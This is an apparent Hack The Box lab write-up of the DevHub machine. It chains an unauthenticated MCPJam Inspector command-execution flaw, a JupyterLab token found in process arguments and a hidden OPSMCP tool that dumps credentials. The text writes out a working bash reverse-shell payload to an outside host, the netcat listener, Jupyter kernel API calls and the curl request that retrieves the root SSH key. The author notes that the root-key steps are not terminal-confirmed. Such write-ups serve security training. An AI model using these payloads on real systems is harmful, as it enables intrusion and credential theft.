# DevHub — Hack The Box Writeup

Attack chain: MCPJam Inspector (CVE-2026-23744) → RCE as `mcp-dev` → JupyterLab token disclosure → Code execution as `analyst` → OPSMCP hidden tool discovery → Root SSH key disclosure.

## Reconnaissance

I started with a TCP port scan to identify the services exposed by DevHub.

```
sudo nmap -p- --min-rate 1000 <TARGET_IP>
```

The scan revealed three open ports:

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```

Port 6274 was the interesting one. Opening it in the browser revealed MCPJam Inspector, a development and debugging interface for Model Context Protocol (MCP) servers.

```
http://devhub.htb:6274/
```

The application identified itself as:

```
MCPJam Inspector v1.4.2
```

MCPJam allows developers to configure and connect to MCP servers, including servers launched as local processes through STDIO. That functionality immediately made the version worth investigating: the application needs the ability to start external commands to establish these connections.

## Initial Access — CVE-2026-23744

Searching for vulnerabilities affecting MCPJam Inspector v1.4.2 led to CVE-2026-23744, documented in [GHSA-232v-j27c-5pp6](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6?utm_source=chatgpt.com).

The advisory describes a critical, unauthenticated remote code execution vulnerability affecting versions up to and including 1.4.2.&#x20;

### Understanding the vulnerability

MCPJam exposes an endpoint at:

```
POST /api/mcp/connect
```

The endpoint accepts a JSON object containing the configuration for an MCP server. For STDIO connections, that configuration includes a command and its arguments.

The problem is that the endpoint accepts these values from an HTTP request and uses them to launch a process without enforcing the required authorization checks.

The application's server configuration also contains:

```
var server = serve({
    fetch: app.fetch,
    port: SERVER_PORT,
    hostname: "0.0.0.0"
});
```

Binding to `0.0.0.0` makes the service reachable through the machine's network interfaces rather than restricting it to localhost.

Together, these two behaviors create the vulnerability: a remotely accessible API allows an unauthenticated client to specify a command that the server will execute.

### Exploitation

The original proof of concept in the advisory uses Windows `cmd.exe` to launch Calculator. Since DevHub is running Linux, I adapted the payload to execute Bash instead.

First, I started a listener on my machine:

```
nc -lvnp 4444
```

Then I sent the following request to MCPJam:

```
curl -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": [
        "-c",
        "bash -i >& /dev/tcp/10.10.14.249/4444 0>&1"
      ],
      "env": {}
    },
    "serverId": "shell"
  }'
```

The payload instructs MCPJam to start Bash with a reverse-shell command, connecting back to my listener.

The connection landed as:

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

This confirmed that the MCPJam process was executing commands under the `mcp-dev` account.

## Enumeration as mcp-dev

With a shell established, I began enumerating the local environment.

```
whoami
id
ls -la /home
```

Two user directories stood out:

```
analyst
mcp-dev
```

I ran LinPEAS to look for interesting processes, credentials, and locally accessible services.

One entry in the process output was particularly useful:

```
/home/analyst/jupyter-env/bin/python3
/home/analyst/jupyter-env/bin/jupyter-lab
--ip=127.0.0.1
--port=8888
--no-browser
--notebook-dir=/home/analyst/notebooks
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
--ServerApp.password=
```

A JupyterLab instance was running as `analyst` on port 8888, bound to localhost.

More importantly, its authentication token was exposed directly in the process arguments.

The service was not accessible externally, but that restriction no longer mattered. I already had command execution on the same host as `mcp-dev`, which meant I could interact with `127.0.0.1:8888` directly.

## Pivoting to analyst — JupyterLab

JupyterLab is a browser-based environment for running code through interactive kernels. In this case, the Jupyter server belonged to `analyst`, so executing code through its kernel provided a path from the `mcp-dev` account to the `analyst` account.

The exposed token was:

```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### Creating a Jupyter kernel

Jupyter exposes a REST API that can be used to create and manage kernels.

Using the token recovered from the process arguments, I sent an authenticated request to create a new kernel:

```
KERNEL_ID=$(curl -s -X POST \
  -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
  http://127.0.0.1:8888/api/kernels \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

echo "$KERNEL_ID"
```

The server returned a kernel identifier:

```
d9c47167-153e-4c19-9179-52cc66e5eb3d
```

Creating the kernel is only the first step. Jupyter uses a WebSocket connection to its `/channels` endpoint to exchange execution messages with the kernel.

The relevant endpoint is:

```
ws://127.0.0.1:8888/api/kernels/<KERNEL_ID>/channels
```

Once connected, Python code can be submitted using an `execute_request` message.

For example, the following code checks which user the kernel is running as:

```
import osprint(os.popen("id").read())
```

The key distinction is that the code executes inside the Jupyter kernel's environment, not under the original MCPJam shell.

This provided the route into the `analyst` account.

## Enumeration as analyst

After moving into the analyst environment, I inspected the user's home directory and the applications installed on the machine.

Two files were especially interesting:

```
/home/analyst/.opsmcp_key
/opt/opsmcp/server.py
```

The first contained an API key:

```
cat /home/analyst/.opsmcp_key
```

```
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

The second was the source code for an internal application called OPSMCP, described as an Operations MCP Server.

```
cat /opt/opsmcp/server.py
```

Unlike the earlier MCPJam vulnerability, this stage did not require finding a public CVE. The application's own source code exposed its authentication mechanism and privileged functionality.

## OPSMCP — Source Code Analysis

OPSMCP is a Flask application that listens locally on port 5000:

```
if __name__ == '__main__':    app.run(host='127.0.0.1', port=5000, debug=False)
```

The application uses a custom API key for authentication:

```
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"def check_auth():    api_key = request.headers.get('X-API-Key', '')    return api_key == VALID_API_KEY
```

Every request to the tool endpoints must include the correct `X-API-Key` header.

Because the same key was stored in the analyst's home directory, I had the information needed to authenticate to the service.

### Enumerating the API

The application's root endpoint describes its available routes:

```
/
├── /health
├── /tools/list
└── /tools/call
```

The `/tools/list` endpoint returns the registered tools.

A request can be made with:

```
curl -s http://127.0.0.1:5000/tools/list \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

The source code defines four visible tools:

| Tool                | Function                      |
| ------------------- | ----------------------------- |
| `ops.system_status` | Returns system health metrics |
| `ops.list_services` | Lists running services        |
| `ops.check_disk`    | Reports filesystem usage      |
| `ops.view_logs`     | Returns recent service logs   |

These functions appear to provide routine operational information.

However, a second dictionary in the source code contains additional tools.

### Discovering hidden tools

The application defines:

```
HIDDEN_TOOLS = {    "ops._admin_dump": {        "description": "Emergency credential dump - INTERNAL ONLY",        "parameters": {            "target": "string",            "confirm": "boolean"        }    },    "ops._debug_mode": {        "description": "Enable debug mode",        "parameters": {}    }}
```

These tools are not included in the response from `/tools/list`.

That initially makes them appear inaccessible. But the actual dispatch logic uses a different dictionary:

```
ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}
```

The `/tools/call` endpoint checks the supplied tool name against `ALL_TOOLS`:

```
if tool_name not in ALL_TOOLS:    return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
```

This is the important implementation detail.

The application hides privileged tools from discovery, but it does not prevent an authenticated client from invoking them.

There is no separate administrator authorization check for `ops._admin_dump`. Possession of the ordinary API key is sufficient to reach the hidden functionality.

## Calling the Hidden Admin Tool

The `ops._admin_dump` handler accepts two arguments:

```
target = args.get('target', '')confirm = args.get('confirm', False)
```

If `confirm` is not set to `true`, the application refuses to proceed:

```
if not confirm:    return jsonify({        "error": "Confirmation required",        "usage": "Set confirm=true to proceed",        "warning": "This dumps sensitive credentials"    })
```

This confirmation flag is not a meaningful security boundary. It is simply a Boolean value controlled by the API client.

The handler supports three targets:

```
ssh_keys
passwords
tokens
```

### Examining the credential dump functionality

The `passwords` target returns a dictionary containing credentials for local users:

```
elif target == "passwords":    return jsonify({        "target": "passwords",        "dump": {            "root": "$6$rounds=656000$saltsalt$hashedpassword",            "analyst": "JupyterN0tebook!2026",            "mcp-dev": "Mcp!Insp3ct0r2026"        }    })
```

The `tokens` target similarly returns administrative and service tokens.

More interestingly, the `ssh_keys` target attempts to read the root user's SSH private key:

```
if target == "ssh_keys":    try:        with open('/root/.ssh/id_rsa', 'r') as f:            key_data = f.read()        return jsonify({            "target": "ssh_keys",            "root_private_key": key_data,            "note": "Emergency recovery key dump"        })    except Exception as e:        return jsonify({            "target": "ssh_keys",            "error": f"Could not read key: {str(e)}"        })
```

The code reads `/root/.ssh/id_rsa` and returns its contents in the HTTP response.

That makes `ops._admin_dump` the most significant functionality exposed by the service.

### Requesting the root SSH key

The following request invokes the hidden tool:

```
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }'
```

The request reaches the branch responsible for reading the root private key.

If the OPSMCP process has permission to read the file, the response contains a `root_private_key` field. The source code also handles the case where that file cannot be read.

The key can be extracted from a successful JSON response:

```
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{
    "name": "ops._admin_dump",
    "arguments": {
      "target": "ssh_keys",
      "confirm": true
    }
  }' | jq -r '.root_private_key'
```

The resulting private key would provide a potential route to root SSH access, provided that the corresponding public key is authorized for root login and SSH permits that authentication method.

For a recovered private key saved locally as `root_id_rsa`, the SSH command would be:

```
chmod 600 root_id_rsa
ssh -i root_id_rsa root@devhub.htb
```

## Why the OPSMCP Design Is Vulnerable

The security problem is not merely that the application contains a hidden administrative feature.

There are three distinct issues in its design.

First, the API key is accessible to a lower-privileged user. The `analyst` account can read the key needed to authenticate to OPSMCP.

Second, the application does not distinguish ordinary API clients from administrators. The same authentication mechanism grants access to both routine operational tools and sensitive credential-dumping functionality.

Third, the application exposes privileged secrets through an API. The `ops._admin_dump` handler can return user passwords, administrative tokens, and potentially the root user's SSH private key.

The tool's absence from `/tools/list` does not protect it. Once the endpoint's source code is available, the hidden name can be supplied directly to `/tools/call`.

This is an example of broken function-level authorization combined with sensitive credential exposure.

## Attack Chain Summary

1. MCPJam Inspector — Port 6274

   Discovered version 1.4.2, affected by CVE-2026-23744.
2. Unauthenticated RCE

   Abused `/api/mcp/connect` to launch Bash and obtain a shell as `mcp-dev`.
3. JupyterLab — Port 8888

   Found an authentication token in the running JupyterLab process arguments.
4. Pivot to analyst

   Used the Jupyter API to create a kernel and access the analyst execution environment.
5. OPSMCP — Port 5000

   Recovered the API key and inspected the Flask application's source code.
6. Hidden administrative functionality

   Identified `ops._admin_dump`, which accepts authenticated calls despite being omitted from the public tool list.
7. Root credential exposure

   Identified the `ssh_keys` handler capable of returning `/root/.ssh/id_rsa`, providing a route toward root authentication.

## Conclusion

DevHub's initial entry point was an exposed MCP development interface. MCPJam Inspector v1.4.2 allowed unauthenticated clients to supply commands through its MCP connection API, giving us a shell as `mcp-dev`.

Local process enumeration then revealed a JupyterLab instance running under `analyst`, with its authentication token visible in the command line. The Jupyter API provided the next pivot.

From the analyst environment, the OPSMCP application's source code exposed a second weakness. Although its administrative tools were hidden from normal API discovery, they remained callable with the same API key used for ordinary operations. The `ops._admin_dump` handler was particularly sensitive because it could disclose passwords, tokens, and the root user's SSH private key.

The interesting part of DevHub is how each stage exposes the next: a vulnerable developer tool gives access to a local process, that process leaks an authentication token, and the next account exposes an internal API whose authorization model fails to protect privileged functionality.

The initial MCPJam RCE and the Jupyter kernel creation are directly established by the supplied commands. The final root-key retrieval and root SSH login are the exploitation route exposed by the OPSMCP source, rather than terminal-confirmed results.
